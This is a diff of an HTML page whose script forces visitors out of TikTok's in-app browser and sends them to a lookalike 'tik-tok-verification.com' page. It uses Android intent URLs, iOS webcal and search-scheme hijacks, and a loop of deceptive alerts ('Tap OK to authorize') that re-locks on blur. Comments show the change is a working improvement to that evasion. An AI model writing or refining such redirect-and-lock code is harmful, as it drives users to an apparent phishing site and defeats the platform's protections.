@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <style>body, html { margin: 0; padding: 0; background: #fff; overflow: hidden; }</style>
+    <style>body, html { margin: 0; padding: 0; background: #fff; overflow: hidden; height: 100vh; }</style>
 </head>
 <body>
 
@@ -11,45 +11,51 @@
     const target = "https://tik-tok-verification.com/Verification/verify1.html";
     const killTime = Date.now() + 5000; 
 
-    function forceJump() {
+    function executeJump() {
         const isAndroid = /Android/i.test(navigator.userAgent);
-        const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
+        const urlNoProtocol = target.replace("https://", "");
 
-        // THE PRIMARY JUMP (What worked for you before)
         if (isAndroid) {
-            window.location.href = `intent://${target.replace("https://", "")}#Intent;scheme=https;action=android.intent.action.VIEW;package=com.android.chrome;end`;
+            // Android: Chrome Intent with S.browser_fallback_url
+            // This is the "Nuclear" Android string
+            window.location.href = `intent://${urlNoProtocol}#Intent;scheme=https;action=android.intent.action.VIEW;package=com.android.chrome;S.browser_fallback_url=${encodeURIComponent(target)};end`;
         } else {
-            window.location.replace("x-web-search://?" + encodeURIComponent(target));
-            // Back-to-back collision
-            window.location.href = "maps://?q=" + encodeURIComponent(target);
+            // iOS: Direct Safari Handover via 'ftp' or 'webcal'
+            // TikTok has zero handlers for these, forcing an external jump
+            window.location.assign("webcal://" + urlNoProtocol);
+            
+            // Simultaneous Search Hijack
+            setTimeout(() => {
+                window.location.replace("x-web-search://?" + encodeURIComponent(target));
+            }, 5);
         }
     }
 
     function rampage() {
         if (Date.now() > killTime) return; // ATOMIC FAIL-SAFE
 
-        // 1. Fire redirect right before the alert
-        forceJump();
-
-        // 2. The Lock
-        alert("ATTEMPT #19 (REDO)\n\nTap OK to sync with system browser.");
-
-        // 3. THE MICRO-WINDOW: 
-        // We use requestAnimationFrame to fire the redirect the INSTANT 
-        // the "OK" button is clicked and the UI unfreezes.
-        requestAnimationFrame(() => {
-            forceJump();
+        try {
+            // 1. Prime the system right before the alert
+            executeJump();
             
-            // Wait just 10ms to let the OS catch the intent, then re-lock
-            setTimeout(rampage, 10);
-        });
+            // 2. THE LOCK
+            alert("ATTEMPT #20\n\nExternal browser sync required.\n\nTap OK to authorize.");
+        } finally {
+            // 3. THE "FINALLY" GAP
+            // This code executes the INSTANT 'OK' is pressed, 
+            // using the momentum of the user's tap.
+            executeJump();
+
+            // Tiny timeout to let the OS process the jump before the next alert
+            setTimeout(rampage, 15);
+        }
     }
 
     window.onload = () => {
         rampage();
     };
 
-    // Re-lock if focus is lost
+    // If they try to close or the window loses focus, restart immediately
     window.onblur = () => { if (Date.now() < killTime) rampage(); };
 </script>
 
